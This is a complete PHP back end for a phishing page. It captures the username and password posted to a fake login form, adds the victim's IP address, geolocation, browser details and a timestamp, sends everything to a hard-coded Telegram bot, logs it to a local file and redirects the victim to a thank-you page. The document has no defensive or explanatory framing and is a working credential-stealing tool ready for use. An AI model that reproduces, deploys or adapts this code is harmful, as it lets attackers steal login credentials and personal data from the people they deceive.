<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    // 🌍 Get IP Address
    $ip = $_SERVER['REMOTE_ADDR'];

    // 🌐 Get User Agent (browser/device info)
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    // 🕒 Get Timestamp
    date_default_timezone_set("Asia/Kolkata"); // Change if needed
    $timestamp = date("d-M-Y h:i:s A");

    // 🌍 Get Location
    $locationData = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
    $location = ($locationData && $locationData['status'] == 'success') 
        ? $locationData['city'] . ", " . $locationData['country'] 
        : "Unknown Location";

    // Format the message
    $message = "🔐 *New Login Captured*\n\n";
    $message .= "👤 Username: `$username`\n\n";
    $message .= "🔑 Password: `$password`\n\n";
    $message .= "🌍 IP: `$ip` | $location\n\n";
    $message .= "🧠 Device: `$userAgent`\n\n";
    $message .= "🕒 Time: `$timestamp`";

    // Telegram Bot API Details
    $botToken = "7873119742:AAGPbwrxfIzspn7QTqWbBFbQFUM-uu_XsU8";
    $chatID = "6103934030";

    // Send message to Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $postData = [
        'chat_id' => $chatID,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    // Also save locally (optional)
    $log = strip_tags($message) . "\n\n";
    file_put_contents("logins.txt", $log, FILE_APPEND | LOCK_EX);

    // Redirect after sending
    header("Location: thankyou.html");
    exit();
}
?>
